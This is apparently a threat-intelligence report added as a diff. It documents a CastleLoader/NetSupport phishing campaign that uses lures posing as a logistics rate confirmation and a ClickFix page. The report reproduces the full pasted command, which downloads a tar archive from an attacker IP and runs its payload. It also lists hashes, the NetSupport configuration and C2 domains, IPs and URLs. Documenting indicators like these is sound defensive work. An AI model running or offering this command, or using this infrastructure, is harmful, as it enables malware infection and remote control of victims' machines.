@@ -1,0 +1,77 @@
+## CastleLoader / NetSupport "NSM350561" | "Ground Transportation" | URLs | ClickFix | 27 January 2025
+
+### ---- Example Email Detail(s) ----
+
+Messages purporting to be (examples):
+
+Sender(s):
+```
+Michael Ravelin <michael@engladlogistlcs.com>
+```
+
+Subject:
+```
+England Logistics Rate Confirmation for load: 12754267
+```
+
+### ---- Description ----
+
+These messages contain URLs leading to a website leveraging the ClickFix technique. If the user copies and pastes the command as instructed, it will run the following command:
+
+```
+conhost --headless cmd.exe /c start /min "%COMSPEC%" "/c cd %TEMP% & curl http:/170.130.165.179/d/12.tar > jt.tar & rd /q /s crc & mkdir crc & tar -xvzf jt.tar -C ./crc & cd crc & start pythonw.exe a\b" & echo           Digital Signature for document#12754267
+```
+
+The command is used to download a tar archive and run CastleLoader. CastleLoader was observed loading NetSupport.
+
+### ---- Example File Detail(s) ----
+```
+File name 	jt.tar
+File Size 	14803968 bytes
+File Type 	POSIX tar archive (GNU)
+MD5 	b53af183217d3e240b53f7a770164ff3
+SHA1 	2452388258b635b588c168b7efdb0c4af1e7169f
+SHA256 	a43b118c9c3b6cf15869cd2ae28a4ea90baf668e7fdecc11dce7579b69bdbf66
+```
+
+### ---- Config(s) ----
+
+NetSupport Config:
+```
+Gateway: pr-site.net:9418
+Gateway: rebellin.net:9418
+Licensee: DONALDTRUMP
+SerialNumber: NSM350561
+```
+
+### ---- IOC(s) ----
+
+```
+Email URLs:
+ type: payload
+ urls:
+ - https://apps.englandlogistics.loadsheets.com/?cr=12&rcr=12&safvllppgjkfs
+ 
+ClickFix Payload:
+ type: payload
+ urls:
+ - http:/170.130.165.179/d/12.tar
+ 
+CastLoader C2s:
+ type: payload
+ urls:
+ - https://imgfuab.com/d/setup_1
+ - https://imgfuab.com/f6b769f8-6f67-5748-b422-cc149597f16f/85dae5eb-a454-5b7b-a60a-b39414da96dd
+ - https://imgfuab.com/f6b769f8-6f67-5748-b422-cc149597f16f
+
+NetSupport C2s:
+ type: C2
+ domains:
+ - pr-site.net
+ - rebellin.net
+ urls:
+ - http://81.19.140.234:9418
+ - http://81.19.140.234/fakeurl.htm
+ ips:
+ - 81.19.140.234
+```
